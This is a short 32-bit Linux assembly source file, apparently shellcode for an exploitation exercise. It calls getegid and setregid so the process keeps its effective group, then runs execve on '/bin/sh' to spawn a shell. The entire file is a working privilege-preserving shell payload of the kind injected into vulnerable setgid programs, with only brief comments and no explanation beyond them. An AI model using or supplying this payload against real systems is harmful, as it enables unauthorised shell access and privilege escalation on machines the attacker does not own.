#include <sys/syscall.h>

.globl  main
.type   main, @function

main:
  /*
      Objective:
        Calling three functions.

        int egid = getegid();
        setregid(egid, egid);
        execve("/bin/sh", 0, 0);
  */
  // getegid()
  push  $50
  pop   %eax
  int   $0x80
  // save eax
  mov %eax, %edx
 
 // setregid
  push $71
  pop %eax
  mov %edx, %ebx
  mov %ebx, %ecx
  xor %edx, %edx
  int $0x80
  
  // execve
  push  $0xb
  pop   %eax
  xor   %esi, %esi
  push  %esi
  push  $0x68732f6e         /* push 6e 2f 73 68  (n/sh) */
  push  $0x69622f2f         /* push 2f 2f 62 69  (//bi */

  mov %esp, %ebx
  xor %ecx, %ecx
  mov %ecx, %edx
  int $0x80
